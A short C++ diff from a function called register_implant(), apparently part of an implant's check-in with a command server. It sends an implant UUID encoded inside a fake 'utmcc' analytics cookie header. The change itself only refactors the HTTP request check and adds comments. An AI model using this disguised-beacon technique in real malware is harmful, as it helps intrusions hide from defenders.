@@ -12,8 +12,13 @@ int register_implant() {
         L"utmcc: gaxpbXBsYW50X3V1aWTZIzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAw"
     };
 
-    if (HTTP_GET(headers, responseBuffer)) {
+    bool http_response = HTTP_GET(headers, responseBuffer);
+
+    if (http_response) {
         std::cout << "Success! Bytes read: " << responseBuffer.size() << std::endl;
+
+        //then transform and pull out data we need
+        //placeholer id" 019bbe19-2c0e-7ee1-a81a-78d7e1a97ac0
     }
     else {
         std::cerr << "Request failed." << std::endl;
